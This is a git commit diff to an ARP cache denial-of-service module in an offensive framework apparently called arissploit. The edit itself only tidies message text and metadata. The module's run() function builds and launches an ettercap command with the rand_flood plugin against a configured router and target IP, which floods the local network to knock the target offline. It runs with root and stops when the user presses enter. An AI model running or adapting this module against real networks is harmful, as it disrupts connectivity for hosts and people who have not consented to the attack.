6afea66f68c889649b7b207289ef68351f3f4aa7
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2019-10-06 17:59:36 +0300

    Update arp_dos.py

--- modules/arp_dos.py
+++ modules/arp_dos.py
@@ -1,4 +1,3 @@
-
 from core.arissploit import *
 from core import colors
 import subprocess
@@ -8,8 +7,7 @@ import os
 conf = {
 	"name": "arp_dos",
 	"version": "1.0",
-	"shortdesc": "arp cache denial of service attack",
-	"github": "entynetproject",
+	"shortdesc": "Arp cache denial of service attack.",
 	"author": "entynetproject",
 	"email": "entynetproject0@gmail.com",
 	"initdate": "3.3.2016",
@@ -23,23 +21,23 @@ conf = {
 
 # List of the variables
 variables = OrderedDict((
-	('target', ['192.168.1.2', 'target ip address']),
-	('router', ['192.168.1.1', 'router ip address']),
-	('interface', ['eth0', 'network interface name']),
+	('target', ['192.168.1.2', 'target ip address.']),
+	('router', ['192.168.1.1', 'router ip address.']),
+	('interface', ['eth0', 'network interface name.']),
 ))
 
 
 # Additional help notes
-help_notes = colors.red+"this module will not work without root permissions!"+colors.end
+help_notes = colors.red+"This module will not work without root permissions!"+colors.end
 
 # Simple changelog
 changelog = "Version 1.0:\nrelease"
 
 def run():
-	printInfo("attack has been started...")
+	printInfo("Attack has been started...")
 	command = 'xterm -e ettercap -i '+ variables['interface'][0] + ' -Tq -P rand_flood ' + '/'+variables['router'][0]+'//' + ' ' + '/'+variables['target'][0]+'//'
 	subprocess.Popen(command, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
-	line_4 = colors.blue+"for stop attack press [enter]"+colors.end
+	line_4 = colors.blue+"To stop attack press [enter]"+colors.end
 	fin = input(line_4)
 	os.system('killall ettercap')
-	printInfo("attack stoped")
+	printInfo("Attack stoped!")
